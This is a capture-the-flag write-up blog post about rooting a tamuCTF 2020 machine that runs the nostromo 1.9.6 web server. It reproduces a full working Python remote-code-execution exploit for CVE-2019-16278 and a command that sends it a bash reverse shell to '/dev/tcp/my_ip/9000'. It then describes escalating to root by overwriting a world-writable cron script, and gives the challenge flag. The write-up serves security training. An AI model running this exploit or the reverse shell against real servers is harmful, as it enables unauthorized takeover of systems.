---
layout: blogpost
title:  "tamuCTF - Rooting Nostromo 1.9.6" 
date:   2020-03-23 03:32:01 -0300
categories: ctf
---

## Category: 
Network/Pentest
## Difficulty: 
Medium-Hard
## Challenge: 
My First Blog
## Description: 
Here is a link to my new blog!  I read about a bunch of exploits in common server side blog tools so I just decided to make my website static.  Hopefully that should keep it secure. The flag is in a folder only readable by root!
<br>
## Solution:

First things first I ran an nmap scan on the server to figure out what webserver the box was running
<br>
```console
Nmap 7.80 scan initiated Fri Mar 20 19:29:57 2020 as: nmap -sV -sC -oN myblog 172.30.0.2
Nmap scan report for 172.30.0.2
Host is up (0.080s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nostromo 1.9.6
|_http-generator: Hugo 0.54.0
|_http-server-header: nostromo 1.9.6
|_http-title: My first blog!
MAC Address: 02:42:7D:36:C6:F0 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Fri Mar 20 19:30:13 2020 -- 1 IP address (1 host up) scanned in 16.32 seconds
```
<br>We can see that its running a nostromo 1.9.6 server. Getting the initial shell was quite easy having rooted a hackthebox machine with the same web server and version. Theres a vulnerability which lets you send a malicious post request that executes any code you want on the machine. We can find an exploit crafted for this by running
<br>

```console 
root@kali: searchsploit nostromo

nostromo 1.9.6 - Remote Code Execution  - exploits/multiple/remote/47837.py
```
<br>
Now that we know theres a RCE in this specific web server, we can run our exploit. I ran this command where exploit.py is the script included below, while running a netcat listener on my local machine and got a reverse shell once the request finished. 
<br>
```bash
python exploit.py 172.30.0.2 80 'bash -i >& /dev/tcp/my_ip/9000 0>&1'
```
<br>
```python
# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278

#!/usr/bin/env python

import sys
import socket

art = """

                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    
"""

help_menu = '\r\nUsage: cve2019-16278.py <Target_IP> <Target_Port> <Command>'

def connect(soc):
    response = ""
    try:
        while True:
            connection = soc.recv(1024)
            if len(connection) == 0:
                break
            response += connection
            
    except:
        pass
    return response

def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/bash HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)

if __name__ == "__main__":

    print(art)
    
    try:
        target = sys.argv[1]
        port = sys.argv[2]
        cmd = sys.argv[3]

        cve(target, port, cmd)
   
    except IndexError:
        print(help_menu)
```
<br>Now that we have our low privlege shell, we need to probe the system and try to escalate our privleges. When we get onto the system I noticed that we were in /bin, so I looked around the directory and noticed that /bin/pidof was symlinked to /sbin/killall5 with other execute privleges... This could prove to be useful. I then checked for processes running as root to get an idea for where our privesc may lie, and got the processes
<br>
```console
bash /tmp/start.sh
cron
sleep 1000000
```
<br>After taking a look at the start.sh script I saw that the system will run the webserver, cron, and then sleep for 1 million seconds. Next I took a look at the crontab and realized where the privesc would be. The system runs /usr/bin/healthcheck every minute as root which would be fine... unless group and other were able to modify that file...
<br>

![crontab_output](/assets/images/ctf/tamu2020/1st_blog_crontab.png)
<br>We modify /usr/bin/healthcheck locally to run a reverse shell, host it on a webserver and put the modified version onto the system and then kill the sleep processes which should run the cronjob again instantly, and within moments we have our root shell! 

![root_shell  ](/assets/images/ctf/tamu2020/1st_blog_exploit_sucess.PNG)

The flag is in /root/flag.txt which we can now print and we get gigem{l1m17_y0ur_p3rm15510n5}